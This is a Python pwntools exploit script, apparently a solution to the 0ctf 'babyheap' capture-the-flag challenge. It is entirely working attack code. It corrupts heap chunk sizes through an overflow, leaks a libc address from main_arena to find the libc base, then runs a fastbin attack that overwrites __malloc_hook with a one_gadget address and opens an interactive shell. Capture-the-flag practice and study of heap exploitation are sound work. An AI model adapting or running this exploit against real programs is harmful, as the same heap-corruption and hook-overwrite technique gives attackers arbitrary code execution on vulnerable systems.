from pwn import *
context.log_level = 'debug'
sh = process('./0ctfbabyheap')
#ENV = {"LD_PRELOAD":"./libc.so.6"}

def allocate(size):
    sh.recvuntil('Command: ')
    sh.sendline("1")
    sh.recvuntil('Size: ')
    sh.sendline(str(size))

def fill(index,content):
    sh.recvuntil('Command: ')
    sh.sendline("2")
    sh.recvuntil('Index: ')
    sh.sendline(str(index))
    sh.recvuntil('Size: ')
    sh.sendline(str(len(content)))
    sh.recvuntil('Content: ')
    sh.sendline(content)

def free(index):
    sh.recvuntil('Command: ')
    sh.sendline("3")
    sh.recvuntil('Index: ')
    sh.sendline(str(index))

def dump(index):
    sh.recvuntil("Command: ")
    sh.sendline("4")
    sh.recvuntil('Index: ')
    sh.sendline(str(index))

#-----leak libc base-------------------
allocate(0x10)  #0
allocate(0x10)  #1
allocate(0x10)  #2
allocate(0x10)  #3
allocate(0x80)  #4 smallbin 
allocate(0x80)  #5

free(2)
free(1)

fill(0,'a'*0x10+p64(0)+p64(0x21)+p8(0x80))
fill(3,'b'*0x10+p64(0)+p64(0x21))
#gdb.attach(sh)
allocate(0x10)  #1
allocate(0x10)  #2  -> 4

fill(3,'b'*0x10+p64(0)+p64(0x91))
free(4)
dump(2)
sh.recvuntil('Content: \n')
leak_addr =u64(sh.recv(8))
main_arena = leak_addr - 88
libc_base = main_arena - 0x3c4b20
print "main_arena: "+ hex(main_arena)
print "libc_base: "+hex(libc_base)
#gdb.attach(sh)

#----------cover malloc_hook to get shell---------
onegadget_off = 0x4526a#0x45216
one_gadget = libc_base + onegadget_off
malloc_hook = main_arena - 0x10

allocate(0x60)  #4
free(4)
fill(2,p64(main_arena-0x33))
allocate(0x60)
allocate(0x60)  #6
fill(6,'A'*0x13+p64(one_gadget))
allocate(0x10)
#gdb.attach(sh)
sh.interactive()
